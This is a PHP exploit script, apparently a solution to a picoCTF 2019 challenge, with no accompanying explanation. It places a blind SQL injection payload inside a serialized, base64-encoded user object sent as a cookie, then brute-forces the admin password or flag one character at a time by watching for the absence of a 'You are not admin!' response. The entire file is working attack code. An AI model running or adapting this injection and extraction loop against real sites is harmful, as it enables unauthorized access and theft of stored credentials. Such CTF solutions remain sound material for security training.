<?php

class siteuser{
	public $username = "guest";
	public $password = "";
}

$a = new siteuser();
$string = "0123456789abcdefghijklmnopqrstuvwxyz!_{}";
$password = "";
$found = false;

while (!$found):
	for ( $i = 0; $i < strlen($string); $i++):
		$a->username = "admin' and 1=0 union all select admin from pico_ch2.users where admin=1 and substr(password,1," . ((int) strlen($password) + 1) . ")='" . $password . $string[$i] ."' -- ";
		if ( send(urlencode(base64_encode(serialize($a)))) !== false ){
			$password .= $string[$i];
			echo "\r" . $password;
			if ( $string[$i] === "}" ) $found = true;
			break;
		}else{
			echo "\r" . $password . $string[$i];
		}

	endfor;
endwhile;

echo "\r" . "Flag : " . $password . "\n";

function send($payload){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"http://2019shell1.picoctf.com:62195/index.php?file=admin");
	curl_setopt($ch, CURLOPT_COOKIE, 'user_info='.$payload);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	return !strstr($server_output, "You are not admin!");
}
